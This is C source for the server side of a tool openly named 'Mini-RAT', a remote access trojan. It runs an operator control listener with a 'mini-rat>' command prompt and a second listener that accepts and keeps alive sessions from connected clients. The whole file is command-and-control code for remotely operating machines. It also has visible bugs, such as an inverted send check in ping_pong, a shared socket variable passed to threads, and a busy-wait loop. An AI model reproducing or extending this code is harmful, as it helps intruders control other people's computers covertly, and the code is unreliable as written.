#include <server.h>
#include <session.h>
#include <logging.h>
#include <mini-rat.h>

void* control_listener(void *port) {
        uint16_t port_num = *(int*)port;
        int server_sock = socket(PF_INET, SOCK_STREAM, 0);
        struct sockaddr_in client_name;
        unsigned int client_name_len = sizeof(client_name);

        struct sockaddr_in name;
        memset(&name, 0, sizeof(name));
        name.sin_family = AF_INET;
        name.sin_port = htons(port_num);
        name.sin_addr.s_addr = htons(INADDR_ANY);
        if (bind(server_sock, (struct sockaddr*)&name, sizeof(name)) < 0) {
                log_msg(LOG_SEVERE, "Cannot bind to port %d\n", port_num);
                return NULL;
        }
        listen(server_sock, 5);
        log_msg(LOG_INFO, "Control listener running on port %d\n", port_num);

        char *ip = NULL;
        int client_sock = 0;
        pthread_t newthread;
        while ((client_sock = accept(server_sock, (struct sockaddr*)&client_name, &client_name_len))) {
                ip = inet_ntoa(client_name.sin_addr);
                log_msg(LOG_INFO, "New control connection opened from %s\n", ip);
                pthread_create(&newthread, NULL, control_worker, (void*)&client_sock);
                pthread_detach(newthread);
        }

        close_logfile();
        close(server_sock);
        return 0;
}

void* control_worker(void *sock_desc) {
        int sock = *(int*)sock_desc;

        char buffer[4096];
        dprintf(sock, "mini-rat> ");
        while (recv(sock, buffer, 4096, 0) > 0) {
                if (strncmp(buffer, "exit", 4) == 0)
                        break;
                parse_cmd(sock, buffer);
                dprintf(sock, "mini-rat> ");
                memset(buffer, 0, 4096);
        }

        close(sock);
        return 0;
}

void* listener(void *port) {
        uint16_t port_num = *(int*)port;
        int server_sock = socket(PF_INET, SOCK_STREAM, 0);
        struct sockaddr_in client_name;
        unsigned int client_name_len = sizeof(client_name);

        struct sockaddr_in name;
        memset(&name, 0, sizeof(name));
        name.sin_family = AF_INET;
        name.sin_port = htons(port_num);
        name.sin_addr.s_addr = htons(INADDR_ANY);
        if (bind(server_sock, (struct sockaddr*)&name, sizeof(name)) < 0) {
                log_msg(LOG_SEVERE, "Cannot bind to port %d\n", port_num);
                return NULL;
        }
        listen(server_sock, 5);
        log_msg(LOG_INFO, "Mini-RAT v%s running on port %d\n", PACKAGE_VERSION, port_num);

        int client_sock = 0;
        pthread_t newthread;
        while ((client_sock = accept(server_sock, (struct sockaddr*)&client_name, &client_name_len))) {
                pthread_create(&newthread, NULL, worker, (void*)&client_sock);
                pthread_detach(newthread);
        }

        close_logfile();
        close(server_sock);
        return 0;
}

int ping_pong(int sock) {
        int ret = 0;
        char buffer[6];
        memset(buffer, 0, 6);

        if (send(sock, "PING\r\n", 6, 0) != -1)
                ret = -1;
        if (recv(sock, buffer, 6, 0) == -1)
                ret = -1;
        if (strncmp(buffer, "PONG\r\n", 6) != 0)
                ret = -1;

        return ret;
}

void* worker(void *sock_desc) {
        int sock = *(int*)sock_desc;
        struct session *ses = find_session(init_session(sock));
        log_msg(LOG_INFO, "New session created with ID=%d\n", ses->id);

        time_t start = time(NULL);
        time_t diff;
        while (ses->alive != 0) {
                diff = time(NULL) - start;
                if (ses->alive == 1 && diff != 0 && diff % 60 == 0)
                        ping_pong(sock);
        }

        return 0;
}
